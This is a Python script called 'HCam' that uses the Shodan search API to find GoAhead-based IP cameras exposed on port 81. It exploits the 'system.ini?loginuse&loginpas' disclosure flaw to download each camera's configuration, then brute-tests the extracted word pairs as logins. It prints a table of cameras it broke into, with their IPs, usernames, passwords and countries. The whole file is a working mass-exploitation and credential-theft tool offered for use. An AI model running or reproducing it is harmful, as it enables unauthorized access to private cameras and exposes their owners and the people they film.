import os
import json
import shodan
import argparse
import configparser
import urllib.request
from geocoder import ip
from requests import get
from requests import session
from prettytable import PrettyTable
from colorama import init, Fore, Back
from progress.bar import IncrementalBar
from requests.auth import HTTPDigestAuth
import requests

parser = argparse.ArgumentParser(description='HCam help')
parser.add_argument("--api", help = 'Change API.', default = None)
parser.add_argument("--ip", help = 'Check the specified IP.', default = None)
parser.add_argument("--country", help = 'Search for vulnerable devices in the country you specify (Alpha-2 FORMAT).', default = None)
args = parser.parse_args()

init(autoreset=True)

start = '''
██╗░░██╗░█████╗░░█████╗░███╗░░░███╗
██║░░██║██╔══██╗██╔══██╗████╗░████║
███████║██║░░╚═╝███████║██╔████╔██║
██╔══██║██║░░██╗██╔══██║██║╚██╔╝██║
██║░░██║╚█████╔╝██║░░██║██║░╚═╝░██║
╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝\n\n'''

if os.path.exists('api_key.config') == False:
  os.system('clear || cls')
  rows = os.get_terminal_size()
  columns = rows.columns
  lines = start.split('\n')
  for line in lines:
    spaces = ' ' * ((columns - len(line)) // 2)
    print(spaces + line)
  while True:
    try:
     api = input('Enter a valid API Key: ')
     if api == '':
      pass
     else:
      key = shodan.Shodan(api)
      key.search('realm="GoAhead", domain=":81"')
      with open('api_key.config', 'w') as e:
       e.write('[API]')
      conf = configparser.RawConfigParser()
      conf.read("api_key.config", encoding='utf-8')
      conf.set("API", "API", api)
      conf.write(open("api_key.config", "w", encoding='utf-8'))
      os.system('clear || cls')
      break
    except KeyboardInterrupt:
      print(Fore.LIGHTRED_EX + "\nProgram stopped.")
      exit()
    except:
      print(Fore.LIGHTRED_EX + "Wrong API key! Try again.\n")
else:
  conf = configparser.RawConfigParser()    
  conf.read("api_key.config", encoding='utf-8')

key = conf.get("API", "api")

def custom(ip):
 if os.path.exists('api_key.config') == False:
  while True:
    try:
     api = input('Enter a valid API Key: ')
     if api == '':
      pass
     else:
      key = shodan.Shodan(api)
      key.search('realm="GoAhead", domain=":81"')
      with open('api_key.config', 'w') as e:
       e.write('[API]')
      conf = configparser.RawConfigParser()
      conf.read("api_key.config", encoding='utf-8')
      conf.set("API", "API", api)
      conf.write(open("api_key.config", "w", encoding='utf-8'))
      #os.system('cls || clear')
      break
    except KeyboardInterrupt:
      print(Fore.LIGHTRED_EX + "\nProgram stopped.")
      exit()
    except:
      print("Wrong API key! Try again.\n")
 else:
  conf = configparser.RawConfigParser()    
  conf.read("api_key.config", encoding='utf-8')

 key = conf.get("API", "api")

 api = shodan.Shodan(key)

 num_of_vulnerable = []
 ips = [ip]

 def st():

  for ip in list(set(ips)):
   try:

    print(f"\nTesting {Fore.CYAN + ip}")
    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)

    with open(f'camera_{ip}.ini', 'wb') as f:
     f.write(r.content)

    if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
     os.remove(f'camera_{ip}.ini')
     print(Fore.LIGHTRED_EX + 'Denied')
     exit()
    else:
     num_of_vulnerable.append(ip)
     print(Fore.LIGHTGREEN_EX + 'Accessed\n')
   except KeyboardInterrupt:
    print(Fore.LIGHTRED_EX + '\nProgram stopped.')
    exit()
   except Exception as _:
    print(f'{ip} not available.')
    exit()
 st()

 tf = ['IP', 'USERNAME', 'PASSWORD', 'zalupa']
 tg = []

 if len(num_of_vulnerable) >= int('1'):
  s = session()

  with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
   raxu = 0
   for ipi in num_of_vulnerable:
    try:
     user = None
     password = None
     file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')

     try:
      data = file.read().replace('\x00', ' ')
      words = data.split()
     except KeyboardInterrupt:
      print(Fore.LIGHTRED_EX + '\nProgram stopped.')
      exit()
     except:
      print('\nSomething went wrong.')
      exit()

     for i in range(len(words)-1):
      try:
       page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
       if page.status_code == 200:
        tg.append(ipi)
        tg.append(words[i])
        tg.append(words[i+1])
        #ad1 = ip(ipi)
        tg.append('ad1.country')
        file.close()
        try:
          os.remove(f'camera_{ipi}.ini')
        except KeyboardInterrupt:
          print(Fore.LIGHTRED_EX + '\nProgram stopped.')
          exit()
        except:
          pass
        bar.next()

       request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
       if request.status_code == 200:
        tg.append(ipi)
        tg.append(words[i])
        tg.append('')
        #ad1 = ip(ipi)
        tg.append('ad1.country')
        file.close()
        try:
          os.remove(f'camera_{ipi}.ini')
        except KeyboardInterrupt:
          print(Fore.LIGHTRED_EX + '\nProgram stopped.')
          exit()
        except:
          pass
        bar.next()
      except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + '\nProgram stopped.')
        exit()
      except Exception as e:
        print(e)
        continue
    except KeyboardInterrupt:
     print(Fore.LIGHTRED_EX + '\nProgram stopped.')
     exit()
    except Exception as e:
     print(e)
     continue

 columns = len(tf)

 table1 = PrettyTable(tf)

 tg_data = tg[:]
 while tg_data:
    table1.add_row(tg_data[:columns])
    tg = tg_data[columns:]
 print(f'\n{table1}\n')
 exit()


def country(country):
 reasons = '''
 [*] API key is not premium.
 [*] Wrong API key.
 [*] Wrong country code (Alpha-2 required)
 [*] No internet connection'''
 try:
  test = shodan.Shodan(key)
  test.search(f'realm="GoAhead", domain=":81", country:{country}')
  global request
  request = f'realm="GoAhead", domain=":81", country:{country}'
  os.system('clear || cls')
 except shodan.exception.APIError as e:
  print(Fore.LIGHTRED_EX + f'\nError: {e}\n')
  exit()
 except:
  print(f'An unexpected error has occurred! Possible reasons:\n{reasons}')
  exit()

if args.country == None:
    request = 'realm="GoAhead", domain=":81"'
    pass
else:
  country(args.country)

if args.ip == None:
    pass
else:
  custom(args.ip)

if args.api == None:
    pass
else:
    try:
        key = shodan.Shodan(args.api)
        key.search('realm="GoAhead", domain=":81"')
        try:
         conf = configparser.RawConfigParser()
         conf.read("api_key.config", encoding='utf-8')
         conf.set("API", "api", args.api)
         conf.write(open("api_key.config", "w", encoding='utf-8'))
         print(Fore.LIGHTGREEN_EX + 'Key updated successfully!\n')
         exit()
        except Exception as i:
         print(i)
         pass
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + "\nProgram stopped.")
        exit()
    except Exception as e:
        print("\nWrong API key! Try again.\n")
        exit()

#os.system('clear || cls')

try:
 mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
except urllib.error.URLError:
 print("Check your internet connection!")
 exit()
except KeyboardInterrupt:
 print(Fore.LIGHTRED_EX + "\nProgram stopped.")
 exit()
except:
 print("Something went wrong!")
 exit()

# init(autoreset=True)

# if os.path.exists('api_key.config') == False:
#   while True:
#     try:
#      api = input('Enter valid API key: ')
#      if api == '':
#       pass
#      else:
#       key = shodan.Shodan(api)
#       key.search('realm="GoAhead", domain=":81"')
#       with open('api_key.config', 'w') as e:
#        e.write('[API]')
#       conf = configparser.RawConfigParser()
#       conf.read("api_key.config", encoding='utf-8')
#       conf.set("API", "API", api)
#       conf.write(open("api_key.config", "w", encoding='utf-8'))
#       #os.system('cls || clear')
#       break
#     except KeyboardInterrupt:
#       print("\nProgram stopped.")
#       exit()
#     except:
#       print("Wrong API key! Try again.\n")
# else:
#   conf = configparser.RawConfigParser()    
#   conf.read("api_key.config", encoding='utf-8')

# key = conf.get("API", "api")

api = shodan.Shodan(key)

num_of_vulnerable = []
ips = []
terminated = False

def st():

 try:
  results = api.search(request)
 except shodan.exception.APIError:
  os.remove('api_key.config')
  print('Wrong API key!\nRestart the program and enter the correct API.')
  exit()
 except KeyboardInterrupt:
  print(Fore.LIGHTRED_EX + "\nProgram stopped.")
  exit()

 for result in results['matches']:
  ips.append(format(result['ip_str']))

 for ip in list(set(ips)):
  try:

   print(f"Testing {Fore.CYAN + ip}")
   r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)

   with open(f'camera_{ip}.ini', 'wb') as f:
    f.write(r.content)

   if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
    os.remove(f'camera_{ip}.ini')
    print(Fore.LIGHTRED_EX + 'Denied\n')
   else:
    num_of_vulnerable.append(ip)
    print(Fore.LIGHTGREEN_EX + 'Accessed\n')
  except KeyboardInterrupt:
    print(Fore.LIGHTRED_EX + '\nProgram stopped.')
    global terminated
    terminated = True
    break
    #exit()
  except:
    print(f'{ip} not available.\n')
    continue
st()

if len(num_of_vulnerable) >= int('1'):
  taro2 = Fore.LIGHTGREEN_EX + str(len(num_of_vulnerable))
else:
  taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))

th = ['IP', 'PORT', 'USERNAME', 'PASSWORD', 'LAND']
td = []

if len(num_of_vulnerable) >= int('1'):
 s = session()

 with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
  raxu = 0
  for ipi in num_of_vulnerable:
    try:
     user = None
     password = None
     file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')

     try:
      data = file.read().replace('\x00', ' ')
      words = data.split()
     except KeyboardInterrupt:
      print(Fore.LIGHTRED_EX + '\nProgram stopped.')
      exit()
     except:
      print(Fore.LIGHTRED_EX + '\nSomething went wrong.')
      exit()

     for i in range(len(words)-1):
      try:
       page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
       if page.status_code == 200:
        td.append(ipi)
        td.append('81')
        td.append(words[i])
        td.append(words[i+1])
        ad = ip(ipi)
        td.append(ad.country)
        file.close()
        try:
          os.remove(f'camera_{ipi}.ini')
        except KeyboardInterrupt:
          print(Fore.LIGHTRED_EX + '\nProgram stopped.')
          exit()
        except:
          pass
        bar.next()
        break

       request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
       if request.status_code == 200:
        td.append(ipi)
        td.append('81')
        td.append(words[i])
        td.append('')
        ad = ip(ipi)
        td.append(ad.country)
        file.close()
        try:
          os.remove(f'camera_{ipi}.ini')
        except KeyboardInterrupt:
          print(Fore.LIGHTRED_EX + '\nProgram stopped.')
          exit()
        except:
          pass
        bar.next()
        break
      except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + '\nProgram stopped.')
        exit()
      except:
        continue
    except KeyboardInterrupt:
     print(Fore.LIGHTRED_EX + '\nProgram stopped.')
     exit()
    except:
     continue

if len(num_of_vulnerable) >= int('1'):
 columns = len(th)

 table = PrettyTable(th)

 td_data = td[:]
 while td_data:
    table.add_row(td_data[:columns])
    td_data = td_data[columns:]
 print(f'\n{table}\n')
elif terminated == True:
 exit()
else:
 taro = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
 print('Checked devices:', Fore.LIGHTCYAN_EX + str(len(list(set(ips)))))
 print('Vulnerable devices:', taro, '\n')
 print('Vulnerable devices not found! Please try again later.')
